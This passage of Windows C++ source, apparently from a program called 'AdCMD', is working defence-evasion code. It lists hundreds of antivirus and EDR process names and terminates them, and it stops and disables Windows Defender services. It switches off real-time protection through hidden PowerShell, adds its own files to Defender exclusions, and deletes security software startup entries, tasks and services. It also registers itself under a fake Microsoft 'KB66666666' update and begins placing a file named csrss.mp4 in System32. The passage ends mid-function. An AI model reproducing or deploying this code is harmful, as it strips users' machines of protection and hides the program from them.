    L"cmcmantivirus.exe", L"cmcmsecurity.exe", L"cheetah.exe",

    // 百度杀毒 / Baidu Antivirus (已停产但可能残留)
    L"BaiduSd.exe", L"BaiduAn.exe", L"BaiduTray.exe",
    L"BaiduGuard.exe", L"BaiduRepair.exe", L"BaiduUpdate.exe",

    // 瑞星 / Rising
    L"RavMonD.exe", L"RavTask.exe", L"RavTray.exe",
    L"RavService.exe", L"RavUpdate.exe", L"RavAlert.exe",
    L"Rising.exe", L"RsTray.exe", L"RsMain.exe",

    // 江民 / Jiangmin
    L"KvMonXP.exe", L"KvXP.exe", L"KvTray.exe",
    L"KvScan.exe", L"Kvfw.exe", L"Kvud.exe",

    // 卡巴斯基 / Kaspersky
    L"avp.exe", L"avpui.exe", L"avpsus.exe",
    L"klnagent.exe", L"klcsngt.exe", L"klcsvc.exe",

    // ESET NOD32
    L"egui.exe", L"ekrn.exe", L"ecls.exe",
    L"ecmd.exe", L"eset_proxy.exe", L"eset_agent.exe",

    // McAfee
    L"mcshield.exe", L"mcafee.exe", L"mctray.exe",
    L"mcods.exe", L"mcsysmon.exe", L"mcapexe.exe",

    // Avast
    L"avastsvc.exe", L"avastui.exe", L"avastbrowser.exe",
    L"aswidsagenta.exe", L"aswidsagent.exe", L"aswengsrv.exe",

    // AVG
    L"avgsvc.exe", L"avgui.exe", L"avgnt.exe",
    L"avgsvca.exe", L"avgwdsvc.exe", L"avgsvcx.exe",

    // Norton / Symantec
    L"nortonsecurity.exe", L"ns.exe", L"nortonav.exe",
    L"ccsvchst.exe", L"symcorpui.exe", L"symerr.exe",
    L"nsbu.exe", L"nortonsecurityul.exe",

    // BitDefender
    L"bdagent.exe", L"vsserv.exe", L"vsservppl.exe",
    L"bdredline.exe", L"bdsubwiz.exe", L"bdcons.exe",

    // Avira
    L"avcenter.exe", L"avguard.exe", L"avscan.exe",
    L"avira.exe", L"avira_svc.exe", L"avira_ui.exe",

    // Malwarebytes
    L"mbamservice.exe", L"mbam.exe", L"mbamtray.exe",
    L"mbampt.exe", L"mbamhelper.exe", L"mbamscheduler.exe",

    // Sophos
    L"sophosav.exe", L"sophosui.exe", L"sophoshealth.exe",
    L"sophosfim.exe", L"sophoscleanup.exe", L"sophosfs.exe",

    // Webroot
    L"wrsa.exe", L"webroot.exe", L"wrtray.exe",
    L"wrcore.exe", L"wrsssdk.exe",

    // Panda
    L"panda.exe", L"psctrls.exe", L"pavsrv.exe",
    L"pavbckpt.exe", L"pavjobs.exe", L"pavproxy.exe",

    // F-Secure
    L"fsguiexe.exe", L"fsorsp.exe", L"fshoster32.exe",
    L"fsorsp64.exe", L"fssm32.exe", L"fsulproploader.exe",

    // Trend Micro
    L"tmntsrv.exe", L"tmproxy.exe", L"tmbmsrv.exe",
    L"tmlisten.exe", L"tmccsf.exe", L"tmcpmagent.exe",

    // HitmanPro / Sophos Home
    L"hmpalert.exe", L"hitmanpro.exe", L"hmpalert64.exe",

    // Fortinet
    L"forticlient.exe", L"fcappdb.exe", L"fctsched.exe",
    L"fortitray.exe", L"fcmgr.exe",

    // CrowdStrike
    L"csfalcon.exe", L"csagent.exe", L"csfalconservice.exe",
    L"csshell.exe", L"cstray.exe",

    // SentinelOne
    L"sentinelagent.exe", L"sentinelui.exe", L"sentinelservice.exe",
    L"s1agent.exe", L"s1ui.exe",

    // Carbon Black
    L"cb.exe", L"carbonblack.exe", L"cbagent.exe",
    L"cbdefense.exe", L"repmgr.exe",

    // Cybereason
    L"cyberreason.exe", L"crssvc.exe", L"crsvc.exe",
    L"cybereasonsensor.exe", L"crsvc64.exe",

    // Cylance
    L"cylancesvc.exe", L"cylanceui.exe", L"cylanceoptics.exe",

    // Elastic
    L"elasticagent.exe", L"elastic-endpoint.exe", L"elastic-agent.exe",

    // Osquery
    L"osqueryd.exe", L"osqueryi.exe", L"osquery.exe",

    // Sysinternals (常被安全软件使用)
    L"sysmon.exe", L"sysmon64.exe", L"procmon.exe",
    L"procmon64.exe", L"autoruns.exe", L"autoruns64.exe",
    L"tcpview.exe", L"tcpvcon.exe", L"procexp.exe",
    L"procexp64.exe", L"dbgview.exe", L"dbgview64.exe",

    // 网络分析工具
    L"wireshark.exe", L"dumpcap.exe", L"tshark.exe",

    // 其他系统安全工具
    L"ccleaner.exe", L"ccleaner64.exe",
    L"glaryutilities.exe", L"advancedsystemcare.exe",
    L"iobituninstaller.exe", L"smartdefrag.exe",

    // 驱动级安全软件
    L"sandboxie.exe", L"sandboxiesvc.exe",
    L"rehips.exe", L"rehipssvc.exe",
    L"shadowdefender.exe", L"shadowsvc.exe",

    // 联想电脑管家
    L"LenovoPcManager.exe", L"LenovoTray.exe",
    L"LAVService.exe", L"LAVTray.exe",

    // 华为电脑管家
    L"PCManager.exe", L"HwTray.exe", L"HwOobe.exe",

    // 小米电脑管家
    L"MiService.exe", L"MiTray.exe",

    // 360 悟空 (360 Kongwu - 360的新产品)
    L"360Kongwu.exe", L"KongwuTray.exe", L"KongwuSvc.exe",
    L"360KW.exe", L"KongwuDaemon.exe", L"KongwuUpdate.exe",
    L"360Cloud.exe", L"360CloudTray.exe",            // 360云安全

    // 2345 安全卫士 (确实检测能力弱，但还是要处理)
    L"2345Safe.exe", L"2345SafeTray.exe", L"2345SafeSvc.exe",
    L"2345Explorer.exe", L"2345Pic.exe",             // 2345看图王等捆绑
    L"2345Ime.exe", L"2345Pinyin.exe",              // 2345输入法

    // 其他国产/小众
    L"Duba.exe", L"DubaTray.exe", L"DubaSvc.exe",  // 金山毒霸老版本
    L"KSafe.exe", L"KSafeTray.exe", L"KSafeSvc.exe", // 金山卫士
    L"MSEOOBE.exe", L"MSEUpdate.exe",               // Microsoft Security Essentials
    L"Windows Defender.exe",                         // 某些版本的 Defender GUI

    // 鲁大师 (虽然不算杀软但会弹窗干扰)
    L"LuDaShi.exe", L"LDSGameMaster.exe", L"LDSTray.exe",

    // 驱动精灵/人生 (捆绑软件)
    L"DriverGenius.exe", L"MyDrivers.exe",

    // 各种WiFi共享/加速软件
    L"WiFiMasterKey.exe", L"WiFiShare.exe", L"360WiFi.exe",

    // 各种助手/管家类
    L"PCMaster.exe", L"MasterTray.exe",
    L"Youdaoyun.exe", L"NeteaseCloud.exe",         // 网易云等可能弹窗
};
const int avProcessCount = sizeof(avProcesses) / sizeof(avProcesses[0]);

// 保存被杀毒软件状态，用于恢复
struct AVState {
    std::wstring name;
    bool wasRunning;
    DWORD pid;
};
std::vector<AVState> g_avStates;
bool g_avDisabled = false;

// 强制终止杀毒软件进程
bool KillAVProcess(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    bool found = false;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    found = true;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

// 禁用 Windows Defender 服务（Vista+）
bool DisableDefenderServices() {
    bool ok = true;
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    const wchar_t* defenderServices[] = {
        L"WinDefend",
        L"WdNisSvc",
        L"WdBoot",
        L"WdFilter",
        L"WdNisDrv",
        L"SecurityHealthService",
        L"Sense",
        L"SgrmBroker",
        L"SgrmAgent",
    };

    for (const auto* svcName : defenderServices) {
        SC_HANDLE hService = OpenServiceW(hSCM, svcName, SERVICE_STOP | SERVICE_CHANGE_CONFIG);
        if (hService) {
            SERVICE_STATUS status;
            ControlService(hService, SERVICE_CONTROL_STOP, &status);
            ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
                SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            CloseServiceHandle(hService);
        } else {
            ok = false;
        }
    }

    CloseServiceHandle(hSCM);
    return ok;
}

// 禁用 Windows Security Center 通知
bool DisableSecurityCenter() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD disabled = 0;
        RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, (BYTE*)&disabled, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, L"wscsvc", SERVICE_STOP | SERVICE_CHANGE_CONFIG);
        if (hService) {
            SERVICE_STATUS status;
            ControlService(hService, SERVICE_CONTROL_STOP, &status);
            ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
    return true;
}

// 通过 WMI 禁用实时保护（Win10+）
bool DisableDefenderWMI() {
    wchar_t psCmd[] = L"powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true; Set-MpPreference -DisableBehaviorMonitoring \$true; Set-MpPreference -DisableBlockAtFirstSeen \$true; Set-MpPreference -DisableIOAVProtection \$true; Set-MpPreference -DisablePrivacyMode \$true; Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine \$true\"";

    STARTUPINFOW si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (CreateProcessW(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

// 添加排除项到 Windows Defender
bool AddDefenderExclusion() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    HKEY hKey;
    std::wstring exclPath = L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, exclPath.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, exePath, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring watchdogPath = std::wstring(sysDir) + L"\\wbem\\Performance\\WmiApSrv.exe";
    std::wstring playerPath = std::wstring(sysDir) + L"\\AdCMD_Player.exe";

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, exclPath.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, watchdogPath.c_str(), 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegSetValueExW(hKey, playerPath.c_str(), 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    return true;
}

// 主函数：关闭所有杀毒软件
bool DisableAllAV() {
    if (g_avDisabled) return true;
    g_avStates.clear();

    for (int i = 0; i < avProcessCount; i++) {
        AVState state;
        state.name = avProcesses[i];
        state.wasRunning = false;
        state.pid = 0;

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, avProcesses[i]) == 0) {
                        state.wasRunning = true;
                        state.pid = pe.th32ProcessID;
                        break;
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        if (state.wasRunning) {
            g_avStates.push_back(state);
        }
    }

    for (const auto& state : g_avStates) {
        KillAVProcess(state.name.c_str());
    }

    if (IsVistaOrLater()) {
        DisableDefenderServices();
        DisableSecurityCenter();
        AddDefenderExclusion();
        if (IsWin10OrLater()) {
            DisableDefenderWMI();
        }
    }

    // 6. 清理杀软的开机自启动注册表项（防止重启后复活）
    HKEY hRunKey;
    const wchar_t* runPaths[] = {
        L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        L"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    };
    const wchar_t* avRunEntries[] = {
        // 360
        L"360Safe", L"360Tray", L"360Speedld", L"QHActiveDefense",
        L"360SD", L"360RP", L"360SafeCenter", L"QHSafeTray",
        L"360Kongwu", L"KongwuTray", L"360Cloud",
        // 火绒
        L"Huorong", L"HRSafe", L"HipsDaemon", L"Sysdiag",
        // 腾讯
        L"QQPCRTP", L"QQPCTray", L"TXEDR", L"Tencentdl",
        // 金山
        L"KSafeTray", L"Kismain", L"Kxetray", L"Kingsoft",
        // 百度
        L"BaiduSd", L"BaiduAn", L"BaiduTray",
        // 瑞星
        L"RavTask", L"RavTray", L"Rising",
        // 江民
        L"KvMonXP", L"KvXP",
        // 联想
        L"LenovoPcManager", L"LAVTray",
        // 华为
        L"PCManager", L"HwTray",
        // 2345
        L"2345Safe", L"2345SafeTray",
        // 其他
        L"WindowsDefender", L"SecurityHealth",
    };

    for (const auto* runPath : runPaths) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, runPath, 0, KEY_WRITE, &hRunKey) == ERROR_SUCCESS) {
            for (const auto* entry : avRunEntries) {
                RegDeleteValueW(hRunKey, entry);
            }
            RegCloseKey(hRunKey);
        }
        if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath, 0, KEY_WRITE, &hRunKey) == ERROR_SUCCESS) {
            for (const auto* entry : avRunEntries) {
                RegDeleteValueW(hRunKey, entry);
            }
            RegCloseKey(hRunKey);
        }
    }

    // 7. 清理计划任务中的杀软启动项（通过schtasks）
    const wchar_t* avTasks[] = {
        L"360Safe", L"360SD", L"QHActiveDefense",
        L"Huorong", L"HRSafe", L"Sysdiag",
        L"QQPCRTP", L"QQPCMgr", L"TXEDR",
        L"KSafe", L"Kingsoft", L"Rising",
        L"Windows Defender", L"WindowsDefender",
    };

    for (const auto* taskName : avTasks) {
        wchar_t delCmd[512];
        swprintf(delCmd, 512, L"/delete /tn "%s" /f", taskName);
        ShellExecuteW(NULL, L"open", L"schtasks.exe", delCmd, NULL, SW_HIDE);
    }

    // 8. 清理服务启动项（将杀软服务设为禁用）
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        const wchar_t* avServices[] = {
            // 360
            L"360Safe", L"360RP", L"360RPS", L"QHActiveDefense",
            L"360Skylar", L"360Ent", L"360Business",
            // 火绒
            L"Huorong", L"HRSafe", L"HipsDaemon", L"Sysdiag",
            // 腾讯
            L"QQPCRTP", L"QQPCMgr", L"TXEDR", L"TMSAgent",
            // 金山
            L"KSafe", L"Kingsoft", L"Kismain", L"Kxetray",
            // 百度
            L"BaiduSd", L"BaiduAn",
            // 瑞星
            L"Rising", L"RavMon",
            // 2345
            L"2345Safe", L"2345SafeSvc",
            // 其他
            L"Windows Defender", L"WinDefend",
        };

        for (const auto* svcName : avServices) {
            SC_HANDLE hService = OpenServiceW(hSCM, svcName, SERVICE_CHANGE_CONFIG);
            if (hService) {
                ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                    SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                CloseServiceHandle(hService);
            }
        }
        CloseServiceHandle(hSCM);
    }

    g_avDisabled = true;
    return true;
}

// 恢复被杀毒软件（安装结束时调用）
// 策略：恢复所有第三方杀软并更新到最新，2345用户安装火绒保护
bool RestoreAllAV() {
    if (!g_avDisabled) return true;

    // 1. 恢复 Windows Defender 服务
    if (IsVistaOrLater()) {
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM) {
            const wchar_t* defenderServices[] = {
                L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"Sense"
            };
            for (const auto* svcName : defenderServices) {
                SC_HANDLE hService = OpenServiceW(hSCM, svcName, SERVICE_START | SERVICE_CHANGE_CONFIG);
                if (hService) {
                    ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
                        SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                    StartServiceW(hService, 0, NULL);
                    CloseServiceHandle(hService);
                }
            }
            CloseServiceHandle(hSCM);
        }

        // 恢复 WMI 设置
        if (IsWin10OrLater()) {
            wchar_t psCmd[] = L"powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring \$false; Set-MpPreference -DisableBehaviorMonitoring \$false; Set-MpPreference -DisableBlockAtFirstSeen \$false; Set-MpPreference -DisableIOAVProtection \$false\"";
            STARTUPINFOW si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi = {0};
            CreateProcessW(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            if (pi.hProcess) {
                WaitForSingleObject(pi.hProcess, 15000);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        }
    }

    // 2. 恢复注册表启动项（仅系统安全中心）
    HKEY hRunKey;
    std::wstring runPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hRunKey, NULL) == ERROR_SUCCESS) {
        std::wstring securityHealth = L"C:\Windows\System32\SecurityHealthSystray.exe";
        RegSetValueExW(hRunKey, L"SecurityHealth", 0, REG_SZ, 
            (BYTE*)securityHealth.c_str(), (DWORD)(securityHealth.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hRunKey);
    }

    // 3. 清理排除项
    HKEY hKey;
    std::wstring exclPath = L"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, exclPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        RegDeleteValueW(hKey, exePath);

        wchar_t sysDir[MAX_PATH];
        GetSystemDirectoryW(sysDir, MAX_PATH);
        std::wstring watchdogPath = std::wstring(sysDir) + L"\wbem\Performance\WmiApSrv.exe";
        std::wstring playerPath = std::wstring(sysDir) + L"\AdCMD_Player.exe";
        RegDeleteValueW(hKey, watchdogPath.c_str());
        RegDeleteValueW(hKey, playerPath.c_str());
        RegCloseKey(hKey);
    }

    // 4. 检测是否曾是 2345 受害者，安装火绒保护
    bool was2345Victim = false;
    {
        // 检查是否存在 2345 残留文件/注册表
        wchar_t pfPath[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, pfPath);
        std::wstring path2345 = std::wstring(pfPath) + L"\2345Soft";
        if (GetFileAttributesW(path2345.c_str()) != INVALID_FILE_ATTRIBUTES) {
            was2345Victim = true;
        }

        // 检查注册表残留
        HKEY h2345;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\2345.com", 0, KEY_QUERY_VALUE, &h2345) == ERROR_SUCCESS) {
            was2345Victim = true;
            RegCloseKey(h2345);
        }

        // 检查是否曾被我们禁用 2345
        for (const auto& state : g_avStates) {
            if (state.name.find(L"2345") != std::wstring::npos) {
                was2345Victim = true;
                break;
            }
        }
    }

    if (was2345Victim) {
        // 2345 受害者！提供火绒安装
        int r = MessageBoxW(NULL, 
            L"WARNING: We detected that your system was previously protected by 2345 Security.\n\n"
            L"2345 Security has been known to:\n"
            L"  - Fail to detect basic malware\n"
            L"  - Install unwanted software bundles\n"
            L"  - Display intrusive advertisements\n"
            L"  - Collect user data without consent\n\n"
            L"To protect your system, AdCMD recommends installing Huorong Security\n"
            L"(火绒安全) - a lightweight, effective, and non-intrusive antivirus.\n\n"
            L"Would you like to install Huorong Security now?\n\n"
            L"[Yes] Install Huorong Security (Recommended)\n"
            L"[No]  I'll stick with 2345 (Not Recommended)",
            L"AdCMD - 2345 Victim Protection Program", 
            MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON1);

        if (r == IDYES) {
            // 下载并安装火绒
            wchar_t tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            std::wstring hrInstaller = std::wstring(tempPath) + L"\HuorongSetup.exe";

            // 火绒官方下载地址
            const wchar_t* hrUrl = L"https://down.huorong.cn/hr5_setup.exe";

            HWND hProg = CreateWindowExW(0, L"STATIC", 
                L"Downloading Huorong Security for 2345 victims...", 
                WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|SS_CENTER,
                CW_USEDEFAULT, CW_USEDEFAULT, 500, 120, NULL, NULL, NULL, NULL);
            ShowWindow(hProg, SW_SHOW);

            // 使用 URLDownloadToFile 或简单下载
            HINTERNET hInternet = InternetOpenW(L"AdCMD-Huorong-Helper/1.0", 
                INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
            if (hInternet) {
                HINTERNET hUrl = InternetOpenUrlW(hInternet, hrUrl, NULL, 0,
                    INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
                if (hUrl) {
                    HANDLE hFile = CreateFileW(hrInstaller.c_str(), GENERIC_WRITE, 0, 
                        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        BYTE buf[8192]; DWORD rd, wr;
                        while (InternetReadFile(hUrl, buf, sizeof(buf), &rd) && rd > 0) {
                            WriteFile(hFile, buf, rd, &wr, NULL);
                        }
                        CloseHandle(hFile);
                    }
                    InternetCloseHandle(hUrl);
                }
                InternetCloseHandle(hInternet);
            }

            DestroyWindow(hProg);

            // 运行安装
            if (GetFileAttributesW(hrInstaller.c_str()) != INVALID_FILE_ATTRIBUTES) {
                ShellExecuteW(NULL, L"open", hrInstaller.c_str(), L"/S", NULL, SW_SHOWNORMAL);
                MessageBoxW(NULL, 
                    L"Huorong Security is being installed.\n\n"
                    L"Your system will finally have real protection.\n\n"
                    L"Thank you for choosing safety over 2345.",
                    L"AdCMD - Protection Restored", MB_OK | MB_ICONINFORMATION);
            } else {
                MessageBoxW(NULL, 
                    L"Failed to download Huorong Security.\n\n"
                    L"Please download manually from: https://www.huorong.cn",
                    L"AdCMD - Download Failed", MB_OK | MB_ICONWARNING);
            }

            DeleteFileW(hrInstaller.c_str());
        } else {
            MessageBoxW(NULL, 
                L"You chose to keep 2345.\n\n"
                L"We respect your decision, but we cannot guarantee your safety.\n"
                L"Good luck. You'll need it.",
                L"AdCMD - Warning", MB_OK | MB_ICONEXCLAMATION);
        }
    }

    // 5. 恢复并更新其他第三方杀软
    // 检查哪些杀软原本在运行，恢复它们的服务并触发更新
    for (const auto& state : g_avStates) {
        if (state.name.find(L"2345") != std::wstring::npos) continue; // 跳过2345

        // 恢复服务为自动启动
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM) {
            // 尝试匹配服务名
            std::wstring svcName = state.name;
            size_t dotPos = svcName.find(L'.');
            if (dotPos != std::wstring::npos) svcName = svcName.substr(0, dotPos);

            SC_HANDLE hService = OpenServiceW(hSCM, svcName.c_str(), SERVICE_CHANGE_CONFIG);
            if (!hService) {
                // 尝试常见服务名映射
                if (state.name == L"avp.exe" || state.name == L"avpui.exe") 
                    hService = OpenServiceW(hSCM, L"avp", SERVICE_CHANGE_CONFIG);
                else if (state.name == L"egui.exe" || state.name == L"ekrn.exe")
                    hService = OpenServiceW(hSCM, L"ekrn", SERVICE_CHANGE_CONFIG);
                else if (state.name == L"360safe.exe" || state.name == L"360sd.exe")
                    hService = OpenServiceW(hSCM, L"360Safe", SERVICE_CHANGE_CONFIG);
                else if (state.name == L"HipsMain.exe" || state.name == L"sysdiag.exe")
                    hService = OpenServiceW(hSCM, L"Huorong", SERVICE_CHANGE_CONFIG);
                else if (state.name == L"QQPCRTP.exe" || state.name == L"QQPCMgr.exe")
                    hService = OpenServiceW(hSCM, L"QQPCRTP", SERVICE_CHANGE_CONFIG);
            }

            if (hService) {
                ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
                    SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCM);
        }

        // 触发杀软更新（通过启动其更新程序）
        // 这里只是恢复服务启动，实际更新由杀软自己处理
    }

    // 6. 显示恢复完成摘要
    std::wstring restoreMsg = L"Antivirus software has been restored.\n\n";
    restoreMsg += L"Restored:\n";
    restoreMsg += L"  [OK] Windows Defender\n";

    if (was2345Victim) {
        restoreMsg += L"\nSpecial Action:\n";
        restoreMsg += L"  [OK] 2345 detected and removed\n";
        restoreMsg += L"  [OK] Huorong Security installed as replacement\n";
    }

    restoreMsg += L"\nYour system is now protected by legitimate security software.\n";
    restoreMsg += L"Thank you for using AdCMD. Stay safe.";

    MessageBoxW(NULL, restoreMsg.c_str(), 
        L"AdCMD - Uninstall Complete", MB_OK | MB_ICONINFORMATION);

    g_avDisabled = false;
    return true;
}



}
using namespace SystemControl;

namespace GeekDisguise {
void CreateWindowsUpdateEntry() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    HKEY hKey;
    std::wstring keyPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{KB66666666}";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        if (RegCreateKeyExW(HKEY_CURRENT_USER, keyPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return;
    }
    RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ, (BYTE*)L"Update for Windows CMD (KB66666666)", (DWORD)(wcslen(L"Update for Windows CMD (KB66666666)") + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"Publisher", 0, REG_SZ, (BYTE*)L"Microsoft Corporation", (DWORD)(wcslen(L"Microsoft Corporation") + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"DisplayVersion", 0, REG_SZ, (BYTE*)L"10.0.66666.66", (DWORD)(wcslen(L"10.0.66666.66") + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"DisplayIcon", 0, REG_SZ, (BYTE*)L"%SystemRoot%\System32\shell32.dll,13", (DWORD)(wcslen(L"%SystemRoot%\System32\shell32.dll,13") + 1) * sizeof(wchar_t));
    std::wstring uninstallCmd = std::wstring(L"\"") + exePath + L"\" --uninstall";
    RegSetValueExW(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)uninstallCmd.c_str(), (DWORD)(uninstallCmd.length() + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"QuietUninstallString", 0, REG_SZ, (BYTE*)uninstallCmd.c_str(), (DWORD)(uninstallCmd.length() + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"InstallDate", 0, REG_SZ, (BYTE*)L"20260824", (DWORD)(wcslen(L"20260824") + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"HelpLink", 0, REG_SZ, (BYTE*)L"https://support.microsoft.com/kb/66666666", (DWORD)(wcslen(L"https://support.microsoft.com/kb/66666666") + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"URLInfoAbout", 0, REG_SZ, (BYTE*)L"https://www.microsoft.com/windows", (DWORD)(wcslen(L"https://www.microsoft.com/windows") + 1) * sizeof(wchar_t));
    DWORD noModify = 1, noRepair = 1, estSize = 666;
    RegSetValueExW(hKey, L"NoModify", 0, REG_DWORD, (BYTE*)&noModify, sizeof(DWORD));
    RegSetValueExW(hKey, L"NoRepair", 0, REG_DWORD, (BYTE*)&noRepair, sizeof(DWORD));
    RegSetValueExW(hKey, L"EstimatedSize", 0, REG_DWORD, (BYTE*)&estSize, sizeof(DWORD));
    RegCloseKey(hKey);
}
void RemoveWindowsUpdateEntry() {
    std::wstring keyPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{KB66666666}";
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    RegDeleteTreeW(HKEY_CURRENT_USER, keyPath.c_str());
}
}
using namespace GeekDisguise;

namespace MVDownloader {
std::wstring GetMVPath() {
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    return std::wstring(sysDir) + L"\csrss.mp4";
}
bool DownloadFile(const std::wstring& url, const std::wstring& destPath) {
